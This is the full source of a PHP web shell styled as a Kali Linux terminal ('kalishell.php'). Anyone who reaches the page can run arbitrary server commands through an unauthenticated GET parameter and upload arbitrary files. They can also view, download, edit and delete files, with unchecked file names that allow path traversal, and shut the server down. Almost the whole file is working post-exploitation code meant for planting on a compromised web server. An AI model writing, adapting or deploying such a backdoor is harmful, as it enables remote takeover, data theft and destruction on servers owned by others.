<!DOCTYPE html>
<html>

<head>
  <title>KaliLinux SHELL</title>
  <style>
        body {
            background-color: black;
            color: white;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }

        #terminal-container,
        #table-container,
        .footer-container,
        .under-ground {
            flex: 1;
        }

        h1 {
            color: #2778ff;
            margin: 0;
            white-space: pre-line;
        }

        form {
            display: inline-block;
        }

        input {
            background-color: black;
            color: white;
            border: none;
            outline: none;
            width: 200px;
            padding: 5px;
        }

        button {
            display: none;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th,
        td {
            border: 1px solid white;
            padding: 8px;
            text-align: left;
        }

        th {
            background-color: #2778ff;
            color: black;
        }

        address {
            margin-top: 20px;
        }

        a {
            color: #4eff4e;
            /* Green color for links */
        }

        .disabled {
            color: red;
            /* Red color for disabled functions */
        }

        .footer-container {
            background-color: black;
            color: white;
            text-align: center;
            padding: 10px;
            width: 100%;
        }

        #login-container {
            text-align: center;
        }

        form {
            display: inline-block;
            text-align: left;
        }

        input {
            background-color: black;
            color: white;
            border: none;
            outline: none;
            width: 200px;
            padding: 5px;
            margin-bottom: 10px;
        }

        button {
            background-color: #2778ff;
            color: black;
            border: none;
            padding: 8px 12px;
            cursor: pointer;
        }

        button:hover {
            background-color: #1858c9;
        }

        .scrollable {
            overflow: auto;
            max-height: 500px;
        }
    </style>
</head>

<body>
  
  <?php


  function getUser() {
      return trim(shell_exec('whoami'));
  }

  function executeCommand($command) {
      return shell_exec($command);
  }

  function getIp() {
    $ip = $_SERVER['REMOTE_ADDR'];
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
 
    return $ip;
  }

  function getOpenBaseDir() {
    return ini_get('open_basedir');
  }

  function upload_file() {
    echo '<form action="" method="post" enctype="multipart/form-data" name="upload" id="upload">';
    echo '<input type="file" name="file" size="50"><input name="up" type="submit" id="up" style="color:green" value="Upload"></form>';
    if( $_POST['up'] == "Upload" ) {
      if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<script>alert("SUCCESS TO UPLOAD!!");window.location.href="kalishell.php";</script>'; }
      else { echo '<script>alert("FAILED TO UPLOAD!!");window.location.href="kalishell.php";</script>'; }
      }
  }




  $user = getUser();
  $output = '';

  if (isset($_GET['command'])) {
      $command = $_GET['command'];
      $output = executeCommand($command);
  }
  if (isset($_GET['serveroff'])) {
       return trim(shell_exec('shutdown now')) || trim(shell_exec('shutdown -s -t'));
  }

  $ip = getIp();
  $openBaseDir = getOpenBaseDir();
  $date = date("Y-m-d H:i:s");
  $functionToCheck = 'exec';
  $isphp = phpversion();  
  ?>

  <div id="terminal-container">
 <small><p style="color:red">Dev By:https://github.com/hidayatimam/php_shell</p></small>
    <h1>┌──(<?= $user ?>㉿<?= $user ?>)-[~]<br>└─$
      <form id="terminalForm" action="<?=$_SERVER['PHP_SELF'];?>" method="GET" enctype="multipart/form-data">
        <input type="text" name="command" autocomplete="off" autofocus onkeydown="submitForm(event)">
        <button type="submit"></button>
      </form>
    </h1>
    <pre><?=$output;?></pre>
    <address><?php  $apacheVersion = system("apache2 -v");?></address>
  </div>

  <div id="table-container">
    <table>
      <tr>
        <th>IP Server</th>
        <th>PHP Version</th>
        <th>Date and Time</th>
        <th>Document Root</th>
        <th>Upload</th>
        <th>Power Off</th>
      </tr>
      <tr>
        <td><?php echo $ip; ?></td>
        <td><?php echo $isphp; ?></td>
        <td><?php echo $date; ?></td>
        <td><?php echo $openBaseDir; ?></td>
        <td><?php upload_file('.')?></td>
        <td><a href="<?=$_SERVER['PHP_SELF'];?>?serveroff" style="color:red">Shutdown</a></td>
        
      </tr>
    </table>
  </div>
  <div class="footer-container">
  <?php listFiles('.'); ?>
  <?php

function listFiles($directory)
{
    $files = array_diff(scandir($directory), array('.', '..'));

    echo '<table>';
    echo '<tr><th>Name</th><th>Type</th><th>Actions</th></tr>';

    foreach ($files as $file) {
        $filepath = $directory . '/' . $file;
        $fileType = is_dir($filepath) ? 'Directory' : 'File';

        echo "<tr>";
        echo "<td>$file</td>";
        echo "<td>$fileType</td>";
        echo "<td><a href='kalishell.php?action=view&file=$file'>View</a> | ";
        echo "<a href='kalishell.php?action=download&file=$file'>Download</a> | ";
        echo "<a href='kalishell.php?action=edit&file=$file'>Edit</a> | ";
        echo "<a href='kalishell.php?action=delete&file=$file' onclick='return confirm(\"Are you sure?\");'>Delete</a></td>";
        echo "</tr>";
    }

    echo '</table>';
}
function viewFile($file)
{
    $filePath = "./$file";
    
    if (file_exists($filePath) && is_file($filePath)) {
        $fileContent = htmlentities(file_get_contents($filePath));
        
        echo "<h2>Viewing $file</h2>";
        echo "<div style='background-color: #111; color: #eee; padding: 10px;'>";
        echo "<pre style='white-space: pre-wrap; overflow-x: auto; max-height: 500px;'>";
        echo "$fileContent</pre>";
        echo "<a href='kalishell.php'>Back</a>";
        echo "</div>";
    } else {
        echo "<h2>File not found: $file</h2>";
    }
}
function downloadFile($file)
{

  $filePath = "./$file";
  if (file_exists($filePath) && is_file($filePath)) {
    header('Content-Type: application/octet-stream');
    header("Content-Disposition: attachment; filename=$file");
    readfile($filePath);
    exit;
  } else {
    echo "<h2>File not found: $file</h2>";
  }
}
function deleteFile($file)
{
  $filePath = "./$file";
  if (file_exists($filePath)) {
    unlink($filePath);
    echo "<h2>File deleted: $file</h2>";
    echo "<script>alert('File Successfully Deleted!');window.location.href='kalishell.php';</script>";
  } else {
    echo "<h2>File not found: $file</h2>";
  }
}

function editFile($file)
{
    $filePath = "./$file";
    if (file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $newContent = $_POST['content'];
            file_put_contents($filePath, $newContent);
            echo "<script>alert('File Successfully Deleted!');window.location.href='kalishell.php';</script>";
            echo "<h2>File edited successfully: $file</h2>";
        } else {
            $fileContent = htmlentities(file_get_contents($filePath));
            echo "<h2>Edit $file</h2>";
            echo "<form method='post'>";
            echo "<textarea name='content' rows='10' cols='50'>$fileContent</textarea><br>";
            echo "<input type='submit' value='Save Changes'>";
            echo "</form>";
        }
    } else {
        echo "<h2>Unable to edit file: $file</h2>";
    }
}
$action = isset($_GET['action']) ? $_GET['action'] : '';
$file = isset($_GET['file']) ? $_GET['file'] : '';
switch ($action) {
  case 'view':
    viewFile($file);
    break;
  case 'download':
    downloadFile($file);
    break;
  case 'delete':
    deleteFile($file);
    break;
    case 'edit':
      editFile($file);
      break;
}

?>

  </div>
  <div class="under-ground">
   
  </div>

  <script>
function submitForm(event) {
  if (event.key === "Enter") {
    event.preventDefault();
    var commandInput = document.querySelector('input[name="command"]');
    var commandValue = commandInput.value.trim(); // Trim whitespace

    if (commandValue !== "") {
      document.getElementById("terminalForm").submit();
    } else {
      alert("[Enter]Not Command ");
    }
  }
}

  </script>
</body>

</html>
